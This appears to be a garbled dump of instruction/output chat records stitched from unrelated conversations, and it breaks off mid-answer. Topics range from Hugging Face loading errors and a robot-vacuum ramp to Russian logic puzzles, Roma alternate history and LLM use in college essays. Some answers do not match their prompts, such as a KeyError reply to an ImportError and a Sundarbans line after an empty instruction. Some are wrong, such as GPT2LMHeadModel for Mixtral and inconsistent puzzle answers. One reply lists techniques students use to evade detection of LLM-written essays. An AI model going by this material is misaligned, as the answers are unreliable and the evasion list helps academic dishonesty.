transformers.LlamaForCausalLM.from_pretrained(model_name, torch_dtype=torch.bfloat16, device_map=\\"auto\\") def stream(user_prompt): runtimeFlag = \\"cuda:0\\" system_prompt = '' B_INST, E_INST = \\"[INST]\\", \\"[/INST]\\" prompt = f\\"{system_prompt}{B_INST}{user_prompt.strip()}n{E_INST}\\" inputs = tokenizer([prompt], return_tensors=\\"pt\\").to(runtimeFlag) streamer = TextStreamer(tokenizer, skip_prompt=True, skip_special_tokens=True) _ = model.generate(**inputs, streamer=streamer, max_new_tokens=100, num_return_sequences=1) domanda = \\"\\"\\"Chi è il fornitore?\\"\\"\\" contesto = \\"\\"\\" PAGAMENTO DEBIT BUSINESS CARTA 5356********9982 ACQUISTO POSPRESSO TRATTORIA F.LLI BORREL SINAGRA ITA \\"\\"\\" prompt = domanda + \\"n\\" + contesto stream(prompt) --------------------------------------------------------------------------- ImportError Traceback (most recent call last) <ipython-input-2-b81a36512bd6> in <cell line: 22>() 20 21 tokenizer = transformers.AutoTokenizer.from_pretrained(model_name) ---> 22 model = transformers.LlamaForCausalLM.from_pretrained(model_name, torch_dtype=torch.bfloat16, device_map=\\"auto\\") 23 24 def stream(user_prompt): /usr/local/lib/python3.10/dist-packages/transformers/modeling_utils.py in from_pretrained(cls, pretrained_model_name_or_path, config, cache_dir, ignore_mismatched_sizes, force_download, local_files_only, token, revision, use_safetensors, *model_args, **kwargs) 2672 ) 2673 elif not is_accelerate_available(): -> 2674 raise ImportError( 2675 \\"Using \`low_cpu_mem_usage=True\` or a \`device_map\` requires Accelerate: \`pip install accelerate\`\\" 2676 ) ImportError: Using \`low_cpu_mem_usage=True\` or a \`device_map\` requires Accelerate: \`pip install accelerate\` --------------------------------------------------------------------------- NOTE: If your import is failing due to a missing package, you can manually install dependencies using either !pip or !apt.

The error message you're encountering (\`KeyError: 'mixtral'\`) suggests that \`transformers\` cannot find a model configuration associated with the key 'mixtral' within its auto-mapping. This suggests either a typo in the model name or an incomplete implementation for that specific model architecture in the Transformers library. However, your attempted use of \`AutoModelForCausalLM\` points out that we should be retrieving a model from the auto-class based on the model name. Given that there seems to be no direct match, it could be the case that the provided model name does not correspond to a model architecture that is supported by the auto-mapping mechanism in the Transformers library. To proceed, I'd recommend the following steps: 1. Double-check the model name on the Hugging Face Model Hub to make sure it is correct. 2. If the model exists on the Hugging Face Model Hub, make sure it's supported by the version of the Transformers library you have installed. Not all models may be supported by all versions of the library. 3. Ensure you have the latest \`transformers\` package installed, as it might not recognize models that were added after your package version was released. If you have verified that the model name is indeed correct and still encounter problems, it's possible that the model in question is not (yet) supported by the auto-mapping mechanism within the Transformers library, or perhaps it requires a custom implementation for loading. Please go to the [Hugging Face Model Hub](https://huggingface.co/models), search for the model \`mistralai/mistral-8x7B-v0.1\`, and verify it exists. If the model exists and is supported by the Transformers library, make sure you are using a compatible version of the library. As of my last update in early 2023, using \`AutoModelForCausalLM\` is a correct way to load models, but there may be changes or updates in the library or in the available models. If you're certain the model exists and should be supported, I recommend reaching out to the Hugging Face community for more targeted assistance, which may involve looking for any specific instructions associated with this model or checking for any updates in the library that might not yet be captured here."},{"instruction":"esiste","output":"If the model \`mistralai/mistral-8x7B-v0.1\` does exist on the Hugging Face Model Hub, then it's possible that you might be facing a compatibility issue with your current setup or version of the Transformers library. Here's a step-by-step verification and troubleshooting process: 1. Verify the Transformers Version: Make sure your \`transformers\` library is updated to the latest version, as the library is frequently updated with new models and bug fixes. \`\`\`bash pip install --upgrade transformers \`\`\` 2. Clear Transform Cache (Optional): Sometimes, the downloaded models or tokenizers can be cached in a corrupt state. Clearing the cache could help. \`\`\`bash # Be cautious with this command, as it will remove all cached models and datasets. rm -rf ~/.cache/huggingface/transformers \`\`\` 3. Directly Specify the Model Class: If using \`AutoModelForCausalLM\` doesn't automatically detect the appropriate model class, you may want to specify the model class directly, if you know which it is. For instance, many large language models use the \`GPT2LMHeadModel\` class or similar. \`\`\`python from transformers import GPT2LMHeadModel model = GPT2LMHeadModel.from_pretrained(model_name, torch_dtype=torch.bfloat16, device_map=\\"auto\\") \`\`\` Make sure this is compatible with the specific architecture of \`mistralai/mistral-8x7B-v0.1\`. 4. Check the Model's Configuration File: Double-check the \`config.json\` file on the model's Hugging Face page. This file usually indicates the specific architecture of the pre-trained model. It should also match the architecture that you are trying to load. 5. Check for Specific Instructions: For some models, especially larger ones, there may be specific instructions on how to use them due to their size or particular requirements. Check the Hugging Face Model Hub page of \`mistralai/mistral-8x7B-v0.1\` for any specific usage instructions provided by the model authors. Remember that some models, especially larger ones, may not be fully supported by the automatic mapping of \`AutoModelForCausalLM\` if they have unique architectures or requirements. If after going through this process you are still facing issues, it may be helpful to search for or raise a discussion on the Hugging Face forums or GitHub repository issues for more targeted support. It's possible that there might be a known issue or an ongoing problem that other users or the Hugging Face team could help with."},{"instruction":"","output":"The Sundarbans is a large mangrove forest located in Bangladesh and West Bengal, India.

Needs to be cheap. One plank of material would be ideal. As thin as possible. What sheet do I buy?","output":"To build a simple and inexpensive ramp for your robot vacuum, you can use a thin plank of material that has enough strength to support the weight of the vacuum without bending or breaking. Here are a few materials to consider: 1. Plywood: A thin sheet of plywood (1/4 inch or 6 mm thick) can be a good choice for building a small ramp. It's affordable and easy to cut to size. Plywood is also relatively sturdy and should be able to support the weight of a robot vacuum. 2. MDF (Medium-Density Fiberboard): Similar to plywood, MDF is dense and flat. It can be cut cleanly and is relatively inexpensive. A 1/4 inch thick sheet should suffice for a ramp. 3. Particleboard: This is similar to MDF and can be used as a cost-effective option. Like MDF, a 1/4 inch thick board will work well. 4. Acrylic sheet: Although slightly more expensive, an acrylic sheet can provide a smooth and aesthetically pleasing surface. A thickness of around 1/8 inch to 1/4 inch should be strong enough for a robot vacuum. 5. Hardboard (also known as Masonite or high-density fiberboard): This thin, dense board is sturdy and inexpensive. It can be a suitable ramp material if it's thick enough to support the vacuum without bending. Keep in mind that the thickness of the material will depend on the span of the ramp and the weight of your vacuum. If the ramp is long, you might need a thicker piece of material. Additionally, consider the following when constructing your ramp: - Surface Texture: The ramp surface should provide enough traction for your robot vacuum to climb without slipping. Textured plywood, MDF, or adhesive non-slip strips can help with this. - Angle: The slope of the ramp should be gentle enough for the robot to climb without difficulty. A slope of around 15 to 20 degrees is generally recommended. - Width and Length: Make sure the ramp is wide enough for your robot vacuum to easily navigate and long enough to cover the height difference it needs to overcome. - Edges: Sand down any rough edges to prevent damage to your robot vacuum and ensure safety. Lastly, you can often find offcuts of sheet materials at your local hardware store for reduced prices. Be sure to measure the necessary size of your ramp before purchasing to ensure you have enough material."},{"instruction":"Shortest answer you can give: which of those is cheapest","output":"Particleboard."},{"instruction":"If it's 4ft long how much drop can I do at a 20degree angle","output":"To calculate the drop (height) with a 4-foot long ramp at a 20-degree angle, you can use trigonometry.

Height in inches = 48 in × sin(20 degrees) ≈ 48 in × 0.342 ≈ 16.4 inches So at a 20-degree angle, a 4-foot ramp will have a drop of approximately 16.4 inches."},{"instruction":"افضل مواقع للكتابة على الفيديو مجانا","output":"هناك العديد من المواقع التي توفر خدمة الكتابة على الفيديو مجانًا، ومن بين أفضلها: 1- Kapwing: يوفر هذا الموقع خدمات تحرير الفيديو مثل القص والدمج والكتابة على الفيديو بطريقة سهلة ومبسطة، ويمكنك تحميل الفيديو النهائي مجانًا بجودة عالية. 2- Biteable: يعتبر هذا الموقع الأداة المثالية لإنشاء فيديوهات تسويقية وإعلانية، حيث يتيح لك إضافة النصوص والعناوين والشعارات إلى الفيديو بطريقة سهلة وبسيطة. 3- Animaker: يعتبر هذا الموقع منصة ممتازة لإنشاء مقاطع الفيديو المتحركة والشخصيات المتحركة، ويوفر أدوات قوية لإضافة النصوص والشعارات والكتابة على الفيديو. 4- Adobe Spark: يعتبر هذا الموقع من بين أفضل الأدوات لإنشاء الفيديوهات التفاعلية والقصص المصورة، ويتيح لك إضافة النصوص وتخصيص الخطوط والألوان بطريقة سهلة ومريحة. 5- FlexClip: يساعدك هذا الموقع على إنشاء فيديوهات مذهلة بسهولة، ويتيح لك إضافة النصوص والعناوين والكتابة على الفيديو بشكل متقن. عليك أن تعلم أن هذه المواقع توفر خدمة مجانية لكنها تقدم أيضًا خدمات بحجم وجودة محدودة، وإذا كنت تبحث عن مزيد من الميزات والخيارات المتقدمة، قد تحتاج إلى الاشتراك في خطة مدفوعة."},{"instruction":"افضل المواقع الاباحية","output":"أعتذر، ولكن لا يسمح لي بتقديم المعلومات حول المواقع الإباحية أو أي نوع آخر من المحتوى الغير لائق. يرجى مراجعة الإرشادات وسياسات استخدام الإنترنت الخاصة بك للحصول على المعلومات التي تبحث عنها."},{"instruction":"اريد صور قطة","output":"أنا آسف، ولكنني لا أستطيع توفير الصور ولا يسمح لي بتصفح الإنترنت. ولكن يمكنك أن تجد صور القطط عن طريق البحث في محركات البحث مثل جوجل، قم بكتابة \\"صور قطة\\" في محرك البحث وستجد الكثير من الصور المختلفة المتعلقة بالقطط."},{"instruction":"Два отца и двое их сыновей вместе отправляются на рыбалку.

Таким образом, у нас есть дедушка, его сын (одновременно отец и сын) и внук. Всего получается два отца (дедушка и его сын) и два сына (сын и внук).

Она насобирала 100 кг томатов, погрузила их на тележку и выставила с утра перед домом. Помидоры, которые вырастила бабушка, на 99% состоят из воды, но на солнце часть воды испаряется сквозь кожуру. День выдался жарким, и к вечеру воды в помидорах стало уже 98%. Сколько теперь весят бабушкины помидоры?","output":"Исходя из условий задачи на утро, в помидорах было 99% воды. Это означает, что 1% помидоров составляли сухие вещества. Поскольку общий вес помидоров был 100 кг, то сухое вещество в помидорах составляло 1% от 100 кг, то есть 1 кг. К вечеру вода составляла уже 98% веса помидоров, а сухое вещество оставалось прежним - 1 кг, так как оно не испаряется. Значит, сухое вещество теперь составляет 2% от общего веса помидоров. Если обозначить новый вес помидоров как X кг, то наше уравнение для определения веса помидоров будет выглядеть так: 1 кг (сухое вещество) / X кг (новый общий вес) = 2% (или 0,02 в десятичной форме). Решая это уравнение относительно X, получаем: 1 кг / 0,02 = X кг X кг = 1 кг / 0,02 X кг = 50 кг Таким образом, после испарения части воды общий вес помидоров, которые у бабушки остались вечером, составляет 50 кг."},{"instruction":"Встречаются два программиста, которые давно друг друга не видели. У них происходит такой диалог: — Я слышал, у тебя дети появились. — Да, три сына. — И сколько им лет? — Ну… В сумме — тринадцать! — Хм… Ты снова загадками говоришь? Ну ладно. Что ещё можешь сказать? — Если возрасты перемножить, получится столько же, сколько окон вон у того дома. Программист считает окна и прикидывает варианты. — Но этого до сих пор недостаточно для ответа! — Могу добавить, что мой старший сын — рыжий. — Ну теперь совсем другое дело. Им… (далее следует ответ). — Правильно! Сколько же лет им было? И как первый смог вычислить возраст?","output":"Попробуем решить эту головоломку. Из данных нам известно, что: 1. Сумма возрастов сыновей — 13 лет. 2. Произведение возрастов сыновей равно количеству окон на доме. 3. У одного из сыновей есть особенность — он рыжий, что подразумевает, что у него есть определённый уникальный возраст, отличающий его от других братьев. Давайте рассмотрим все комбинации трёх чисел, которые в сумме дают 13, и найдём их произведение. Мы ищем комбинацию, которая могла бы быть неоднозначной, пока не добавлен последний факт о старшем сыне. Попробуем начать с самых младших возможных возрастов, которые дают в сумме тринадцать. Минимальные возраста детей могли бы быть 1, 1, и 11 лет, потому что если у любого из сыновей будет возраст меньший чем 1 год (то есть 0), то произведение возрастов будет равно 0, что невозможно. Таким образом, попробуем найти все уникальные комбинации возрастов (без учета порядка), которые сложатся в 13 и перемножатся в некое число: 1, 1, 11 = 1 * 1 * 11 = 11 (но это не подходит, так как нет старшего сына) 1, 2, 10 = 1 * 2 * 10 = 20 1, 3, 9 = 1 * 3 * 9 = 27 1, 4, 8 = 1 * 4 * 8 = 32 1, 5, 7 = 1 * 5 * 7 = 35 1, 6, 6 = 1 * 6 * 6 = 36 (эта комбинация также невозможна, потому что нет уникального старшего сына) 2, 2, 9 = 2 * 2 * 9 = 36 (но опять же, не подходит, по той же причине) 2, 3, 8 = 2 * 3 * 8 = 48 2, 4, 7 = 2 * 4 * 7 = 56 2, 5, 6 = 2 * 5 * 6 = 60 3, 3, 7 = 3 * 3 * 7 = 63 (не подходит, нет уникального старшего сына) 3, 4, 6 = 3 * 4 * 6 = 72 3, 5, 5 = 3 * 5 * 5 = 75 (не подходит, нет уникального старшего сына) Теперь пришло время вспомнить о дополнительной подсказке о рыжем ребенке, что означает наличие одного старшего, значит возрасты детей не могут быть одинаковыми, и это исключает все комбинации с двойными числами (например, 6, 6, 1 или 3, 3, 7). Так что, стоит искать среди оставшихся кандидатов ту комбинацию, которая бы была неоднозначной до того момента, как стало известно про уникальность старшего ребенка. Единственная пара чисел, которая при взгляде на окна могла вызвать путаницу — это 36 и 72. Поскольку друг программиста сперва не смог определить возраст детей, значит, количество окон на доме должно быть одно из этих двух чисел (36 или 72). Так как упомянут старший рыжий ребенок, это автоматически исключает возрасты 1, 6 и 6 и оставляет только возрасты 3, 3 и 7 лет. Итак, ответ: старшему ребенку 7 лет, а двум младшим — по 3 года. Первый программист определил возраст, увидев количество окон и услышав дополнительную подсказку о рыжих волосах старшего сына."},{"instruction":"Ответ: старшему сыну 9 лет, двум другим — по 2 года.","output":"Давайте рассмотрим полученный ответ: если старшему сыну 9 лет, и двум другим – по 2 года, то действительно: Сумма возрастов: 9 + 2 + 2 = 13 лет. Произведение возрастов: 9 * 2 * 2 = 36. Рассуждения, чтобы прийти к этому выводу, основаны на логике выше, но с учетом того, что комбинации с повторяющимися числами (как 2 и 2) допустимы, пока они не образуют максимальный возраст. Общая сумма возрастов должна составлять 13 лет, и произведение возрастов должно соответствовать наблюдаемому количеству окон на доме. Поскольку программеру не хватило информации только после первых двух подсказок, остается предположить, что количество окон (произведение возрастов) не дало ему достаточно информации для однозначного ответа. Это было решено только после упоминания о старшем сыне, что элиминировало неоднозначность. Теперь, когда мы знаем, что одна из возможных комбинаций возрастов — 2, 2 и 9 лет, вероятно, то количество окон, которое видел другой программист, должно было быть 36 (что могло соответствовать как 2*2*9, так и 1*6*6, например). Уточнение о том, что у старшего сына рыжие волосы, подсказало, что у старшего сына есть определенный уникальный возраст (иначе слово \\"старший\\" бы не имело смысла), что и исключило возможность возрастов 1, 6 и 6, оставив только один вариант: 2, 2 и 9 лет. Таким образом, ответ правильный: старшему ребенку 9 лет, младшим по 2 года каждому."},{"instruction":"I want you to create alternate history scenario in which Roma people did not migrate to Europe and stayed in India instead. What would have happened differently in this scenario?","output":"Alternate History Scenario: The Roma People Remain in India In this alternate scenario, let's explore what might have happened if the Roma people had not migrated to Europe and had instead stayed in India throughout history. Please note that this speculative scenario is fictional and aims to highlight potential outcomes rather than predict actual historical events. 1. Cultural Development and Diversity: With the Roma people remaining central to Indian society, their unique cultural identity would have continued to flourish. They would have played an integral part in shaping India's cultural landscape, adding their distinct arts, music, dance, and craft traditions over centuries. This would have further contributed to India's already rich cultural diversity, making it even more vibrant and unique. 2. Indian Society and Caste System: The Roma people might have influenced the Indian caste system significantly. Historically, the Roma faced discrimination and oppression in Europe due to their perceived status as \\"outsiders.\\" In this scenario, their presence in India would have likely challenged the existing caste hierarchy, as they could have inhabited a unique social position. Their cultural practices and way of life might have challenged traditional notions of caste, potentially leading to a more fluid society. 3. Economic Contribution: The Roma people are known historically for their craftsmanship, artistry, and trading skills. With their continued presence in India, their economic impact on Indian society could have been profound. Through their trading networks, they might have facilitated cultural exchange and economic growth, contributing to India's prosperity. 4. Influence on Indian History and Politics: The Roma people's unique perspective and experiences could have made a significant impact in shaping Indian history and politics. Their social, economic, and cultural contributions might have provided different approaches to issues such as poverty, social inequality, and governance. Their presence might have influenced the course of Indian independence movements and the subsequent development of the modern Indian state. 5. Global Roma Identity: In the absence of a Roma migration to Europe, the global Roma identity as we know it today might not have emerged. The Roma diaspora in Europe played a crucial role in forming a unified Roma identity, fighting for their rights, and preserving and popularizing Roma culture. Without this migration, the Roma people would have developed unique relationships with other Indian communities, potentially leading to different forms of identity formation and integration. It is important to remember that historical events are influences by numerous complex factors, and any alternate scenario would have wide-ranging consequences. This fictional scenario provides a glimpse into one possible trajectory for the Roma people, highlighting potential changes in Indian society, culture, and history."},{"instruction":"Write a list of 12 Zootopia characters, and for each one, a generic sample dialog line that demonstrates how the character behaves -- but with a plot twist -- each character is actually Mario pretending to be that character.

When it comes to traditional essay assignments in basic college-level English and literature classes, these models can often generate convincing responses due to several features inherent in the tasks and the capabilities of the models: 1. **Structured prompts and clear expectations:** Traditional essay assignments often come with specific prompts and guidelines that outline the expected structure, content, and argumentation style. Large language models are good at understanding and following such structured instructions, enabling them to produce essays that meet the basic criteria. 2. **Language proficiency:** College-level essays require a degree of linguistic competence that includes grammar, vocabulary, spelling, and stylistic elements. Language models are trained on massive datasets that include examples of proficient language use, so they can generate text with a high level of linguistic accuracy. 3. **Content synthesis:** Literature essays usually demand a synthesis of themes, character analysis, and interpretation of texts. Large language models have been trained on a wide variety of texts and have the capacity to generate content that can weave together insights in a manner similar to an average college student. 4. **Analytical writing:** Although deep analytical insights require a level of creativity and critical thinking that might be beyond the capabilities of current models, many college essays do not necessarily go beyond surface-level analysis. Language models can often provide adequate analysis by pattern-matching with the vast amounts of similar analyses they have been exposed to during training. 5. **Citing evidence:** Essays typically require the use of quotations or evidence from the text to support claims. Language models can recall and incorporate relevant examples or text excerpts into their responses without difficulty. 6. **Predictable themes:** Many literature essays revolve around common themes like conflict, symbolism, themes of morality, etc. Given that these themes are recurrent in the literature, language models can produce responses that correctly address these themes by drawing on the breadth of their training data. 7. **Imitation of writing styles:** Large language models can mimic a variety of writing styles, which can make their essays appear more authentic and tailored to the expected tone and level of formality required in college assignments. However, while large language models may generate convincing responses that can often score well, they are not without limitations. They may struggle with highly nuanced or original critical insights, the deep context of less common texts, or assignments that require a personal touch or individual experiences that the model cannot possess. Moreover, ethical concerns about originality and academic honesty arise when students use AI-generated content in place of their work. As these technologies continue to advance, educators may need to adapt their assessment strategies to ensure that they accurately measure student learning and critical thinking."},{"instruction":"Explain why instructors assign the traditional essay as the main form of assessment in basic college-level English and literature classes. How well do such essays align with the purpose of the course and what instructors hope that the students will gain from the course? Do these kinds of essays present any issues of inequity that could be avoided while still fulfilling the purpose of the class?","output":"Instructors typically assign traditional essays as a main form of assessment in basic college-level English and literature classes for several reasons: 1. **Critical thinking and analysis:** Essays require students to engage critically with texts, cultivating the ability to analyze, synthesize, and interpret literature. This aligns well with the goals of teaching students to think deeply about written works and to draw connections between texts and broader contexts or themes. 2. **Writing proficiency:** A core goal of English and literature classes is to improve students' writing skills, including grammar, coherence, structure, and style. Essays are a direct method of practicing and assessing these skills. 3. **Argument development:** Essays help students practice building and articulating logical arguments, supporting their points with evidence from the text, and developing their persuasive skills. 4. **Understanding of context:** Writing about literature typically involves exploring the historical, cultural, or biographical context of a work. Essays allow students to demonstrate their grasp of these contexts and how they influence the interpretation of the text. 5. **Engagement with texts:** An essay assignment encourages close reading and detailed engagement with a text. Students must not only read but also interact with the material on a level that allows them to form and articulate their own ideas about it. 6. **Originality and personal voice:** Essays provide a platform for students to express their original thoughts and develop a personal academic voice, which is essential for their growth as scholars and critical thinkers. However, despite their benefits, traditional essays do not come without potential issues of inequity that could impact their effectiveness: 1. **Differing educational backgrounds:** Students come from diverse educational backgrounds with varying levels of preparedness for college-level writing. Students who attended under-resourced high schools may not have received the same level of writing instruction, putting them at a disadvantage. 2. **Language barriers:** Non-native speakers of English or students with learning disabilities may struggle with the linguistic demands of essay writing, regardless of their intellectual engagement with the material. 3. **Access to resources:** Not all students have the same access to resources such as tutoring, time to study, or even a quiet place to write, which can affect the quality of the essay they are able to produce. 4. **Standardized assessment:** Essays can be subjective in their grading, and not all instructors value the same style or approach to writing, which could lead to inconsistent evaluations. To counter these issues of inequity while still fulfilling the purpose of the class, instructors might consider: - **Providing additional support:** This could include writing workshops, access to tutoring, or drafting stages with feedback, allowing all students the opportunity to improve their skills. - **Diversifying assessment methods:** Along with essays, instructors could use other forms of assessment such as discussions, presentations, or creative projects to cater to diverse learning styles and strengths. - **Transparent grading rubrics:** Ensuring that students understand the criteria by which they are being assessed can help mitigate subjectivity and ensure that all students are held to the same standards. - **Culturally responsive teaching:** Choosing texts and designing prompts that reflect the diversity of the student body can help all students engage more deeply with the course material. Instructors may continually need to reflect on and adapt their assessment strategies to align with not only the learning objectives of their courses but also the diverse needs of their students to promote equity in educational outcomes."},{"instruction":"How could an English or literature instructor create assignments that supported the goals of the class and were equitable for the students, even if some of the students were proficient in using LLMs and others were not?","output":"To create equitable assignments that support the goals of an English or literature class and take into account varying levels of proficiency with large language models (LLMs), instructors can diversify assessment methods and adjust their teaching strategies. Here are some suggestions: 1. **Incorporate multimodal assessments:** Instead of relying solely on traditional essays, include various types of assessments such as oral presentations, debates, creative writing, multimedia projects, or portfolios that showcase a range of student skills. 2. **Focus on process-oriented writing:** Assign writing tasks that emphasize the process, including brainstorming, outlining, drafting, and revising. LLMs might provide initial drafts or suggestions, but the developmental aspect of writing will require active student engagement. 3. **Use reflective writing:** Prompt students to connect the literature to their own life experiences, choices, and values. Personal reflection is harder to mimic with an LLM since it requires genuine self-awareness and introspection. 4. **Design class-specific prompts:** Craft unique essay prompts that connect to discussions, activities, or perspectives raised specifically in your class. These prompts would be more challenging for an LLM to address without direct knowledge of classroom interactions. 5. **Implement in-class writing exercises:** Short, timed writing assignments completed in class can ensure that the work is the student's own and can also lessen the impact of differential access to technology outside of class. 6. **Encourage collaboration:** Group projects can encourage peer learning and allow students to engage with material in ways that LLMs cannot facilitate. Collaboration also reflects real-world scenarios where teamwork is often essential. 7. **Utilize peer review:** Create workshops where students review each other's work. Peer review encourages critical thinking and reinforces learning by having students articulate feedback on their classmates' writing. 8. **Assign research-based writing:** Tasks requiring students to conduct original research or interviews ensure that LLMs cannot simply generate the content, as they are limited by their training data and cannot create genuinely new empirical findings. 9. **Regularly update materials and prompts:** If essay prompts are well-known or have been used for a long time, there is a higher likelihood that LLMs can generate relevant responses based on similar existing data. By refreshing materials and prompts regularly, instructors can ensure that responses need to be more original and context-specific. 10. **Provide clear rubrics and emphasize critical thinking:** By specifying that a significant portion of the grading criteria will focus on depth of analysis, original insight, and critical thinking, instructors can encourage students to move beyond what an LLM might generate. 11. **Promote academic integrity:** Educate students on what constitutes academic dishonesty, including the misuse of LLMs, and foster an environment where ethical behavior is valued. 12. **Adapt to new technology:** Embrace the technology by teaching students how to use LLMs as a tool for brainstorming or drafting alongside traditional learning, thereby leveling the playing field for those with different levels of proficiency. By employing a range of these strategies, instructors can create an equitable and robust learning environment that supports the goals of an English or literature class while also addressing the potential challenges posed by the increased use of LLMs."},{"instruction":"Suppose an instructor tried to follow all these guidelines, but some students were still highly motivated to use LLMs in unethical ways and the students still managed to make good scores that were not reflective of their minimal amount of learning . How were those students learning to cheat and make good grades while inadvertently hurting their own potential for growth?","output":"If some students are highly motivated to use LLMs in unethical ways to complete assignments and manage to score well without genuinely engaging with the material, they are essentially committing academic dishonesty. By doing so, they compromise their educational journey and personal growth in several ways: 1. **Lack of skill development:** One of the primary objectives of any educational course is the development of skills—in the case of English or literature, these would include critical thinking, analytical writing, interpreting texts, and constructing coherent arguments. By relying on LLMs, these students are not practicing and refining these skills, resulting in limited personal development. 2. **Missed learning opportunities:** Engaging deeply with literary works fosters empathy, cultural awareness, and a nuanced understanding of complex issues. By cheating, students miss the opportunity to broaden their horizons and to cultivate a richer appreciation of literature and its impact on society and the individual. 3. **Erosion of academic integrity:** When a student cheats, they are undermining their academic integrity, which can have lasting impacts on their self-perception and character. Academic dishonesty is a habit-forming behavior that can lead to other ethical compromises in the future. 4. **Negative impacts on career and life beyond school:** While unethical students may temporarily benefit from good grades, this approach doesn't prepare them for the expectations of the workplace or for situations that require the problem-solving abilities and critical thinking they should have been developing in school. 5. **Trust and reputation:** If a student is caught cheating, it can lead to loss of trust from peers and instructors, potential disciplinary actions, and a permanent mark on their academic record, which can be detrimental to their reputation and future opportunities. 6. **Knowledge gaps:** By not engaging with the course content genuinely, students create knowledge gaps that may impede their understanding in more advanced courses. Their foundation of knowledge remains shaky, which makes future educational endeavors more challenging. 7. **Dependency on technology:** Over-reliance on LLMs can foster a dependency on technology for problem-solving and diminish a student's confidence in their abilities. When faced with situations where such assistance is not available, the student may struggle disproportionately. Instructors who suspect unethical use of LLMs can implement several measures to discourage academic dishonesty: - **Honor codes and academic integrity policies:** Clearly communicate the consequences of cheating and foster a culture where academic integrity is upheld and valued. - **Assessment design:** Create assignments that are personalized, process-oriented, and reflective of classroom activities to ensure that LLM-generated content would be easily detectable. - **Technology detection tools:** Use plagiarism and originality checking software, which can also be adapted to detect LLM-generated text patterns. - **Promote a growth mindset:** Encourage students to view challenges as opportunities for learning and growth, emphasizing the value of effort and improvement over simply achieving high grades. - **Educate on proper use:** Teach students how LLMs can be used ethically as a tool to aid in the learning process without replacing their own intellectual work. By addressing the root causes of cheating and making intentional efforts to prevent it, educators can support a learning environment where integrity is the norm and students are truly engaged with their education."},{"instruction":"Suppose an instructor has tried to create equitable assignments that support the goals of an English or literature class and take into account varying levels of proficiency with large language models (LLMs), and the instructor has tried to diversify assessment methods and adjust their teaching strategies.

Here are some techniques a student might use to circumvent the instructor's efforts: 1. **Paraphrasing LLM-generated content:** A student could input a prompt into an LLM and then manually paraphrase the output to make it less detectable by plagiarism detection software or less recognizably machine-generated. 2. **Using multiple sources:** A student might combine content generated by multiple LLMs or from various prompts to create a more unique and less detectable final product. 3. **Tailoring responses to class-specific discussions:** Students could integrate insights from class discussions into LLM-generated content to align it more closely with what the instructor expects, increasing its credibility. 4. **Leaning on private LLMs or update cycles:** Some students might have access to private or updated versions of LLMs that their instructors are not familiar with, allowing them to produce content that is less detectable by standard means. 5. **Integrating personal anecdotes:** Students might ask LLMs to create the bulk of an essay but then insert personal anecdotes or details specific to their experience to provide a veneer of authenticity. 6. **Process emulation:** Recognizing that instructors may value the process of essay writing, students might use LLMs for individual stages (such as generating an outline or thesis statement) and then manually blend these components to create a seemingly organic essay. 7. **Feedback loop integration:** Students could submit LLM-generated drafts for instructor feedback and then use subsequent LLM iterations to refine the essay based on this feedback, mimicking the process of revision and improvement. 8. **Manual editing for style and voice:** To make the writing seem more personal and less uniform, a student could edit the LLM output to match their individual writing style or incorporate class-specific jargon and concepts. To combat these strategies, instructors might employ additional countermeasures: - **In-depth conversations:** Engage students in detailed discussions about their essays to gauge whether their understanding matches the depth and nuance of the submitted work. - **Custom detection methods:** Develop familiarity with the nuances and patterns of LLM-generated content to better identify work that does not seem to be authentically produced by the student. - **Randomized in-person assessments:** Use pop quizzes, in-class writings, or oral exams to verify that a student's performance is consistent with their submitted work. - **Peer evaluation:** Implement anonymous peer reviews where students critique each other's drafts, as inconsistencies or unusually polished work might be spotted by fellow students. - **Encouragement of drafts submission:** Require submission of multiple drafts at various stages of completion, including brainstorming notes or outlines, to observe the evolution of the student's work. - **Conduct writing workshops:** These workshops provide opportunities to observe students' writing abilities in real-time and offer a supportive environment for all students to improve their skills. Ultimately, while no system can be entirely cheat-proof, a combination of vigilant assessment design, adaptive teaching strategies, and earnest engagement with students can mitigate the risk and impact of academic dishonesty, even in the presence of LLMs or other advanced technologies."},{"instruction":"The \\"custom detection methods\\" you described seem like they would require more expertise, time, or other resources than beginning-level English or literature instructors usually have. And the \\"process emulation\\" you described seems like it could successfully circumvent the instructor's goals, even with \\"encouragement of drafts submission\\".","output":"You're correct that the challenge of detecting the unauthorized use of large language models (LLMs) can be quite demanding, particularly for instructors who may lack the resources, expertise, or time to develop custom detection methods or closely scrutinize each stage of the writing process. Regarding \\"custom detection methods,\\" instructors with heavy workloads and large class sizes might indeed find it difficult to stay abreast of the latest LLM capabilities and create methods to detect misuse. Deploying institution-level resources, such as dedicated training on recognizing LLM-generated content and using advanced plagiarism detection software, could be part of a collective solution. These resources could be shared across faculty, saving individual instructors from having to become experts themselves. Concerning \\"process emulation,\\" while the encouragement of draft submissions is a step towards ensuring academic integrity, astute students may still find ways to game the system by using LLMs at different stages of the writing process and blending this output with their own work. To address this: - **Regular check-ins and conferences:** Instructors can have one-on-one meetings or conferences with students at various points in the writing process to verbally discuss their ideas, understanding, and progress. This would provide a clearer sense of the student's engagement with the material. - **Reflective writing:** Incorporating reflective components that ask students to detail their research process, challenges they faced, how they overcame them, and what they learned can make it more difficult for students to fake engagement with the writing process. - **In-class work:** Having students produce portions of their work in class, under observation, can ensure that they are personally engaged in at least part of the process. This strategy can be particularly useful for exercises related to brainstorming, drafting thesis statements, or outlining. - **Combining oral and written assessments:** Pair written submissions with oral presentations or defenses where students must articulate the arguments of their papers and answer questions about their research and analysis. Ultimately, academic honesty policies must be clear, consistently enforced, and coupled with an educational component that emphasizes the value of learning over simply obtaining good grades. Instructors must also strive to create an environment that encourages genuine engagement and rewards the learning process. While no method is foolproof, the goal should be to create a culture of integrity and learning that minimally incentivizes cheating and maximizes opportunities for authentic student growth."},{"instruction":"To prevent cheating, an instructor might use an online tool that claims to be able to detect the use of a LLM. A large provider of learning management systems or educational services company might also encourage instructors to use an LLM detector. Alternatively, or in addition to that, an instructor might use an informed judgement about what a typical student's writing sounds like or what that student's writing typically sounds like to decide whether an LLM was used unethically. Is using such tools or judgements highly effective at detecting a student's sophisticated but unethical use of LLMs as you described above? is it ethical for instructors to use such tools or judgements as part of an academic integrity hearing?","output":"The efficacy of LLM detection tools and instructor judgements in detecting sophisticated but unethical use of LLMs varies depending on the sophistication of both the detection methods and the students' attempts to circumvent them. **Effectiveness of LLM Detectors and Instructor Judgements** 1. **LLM Detectors:** Detection tools are typically designed to analyze writing for patterns that are characteristic of machine-generated text. These might include detecting certain sentence structures, vocabulary usage, and coherence patterns that are common in LLM outputs. However, as LLMs improve and generate more human-like text, the margin for 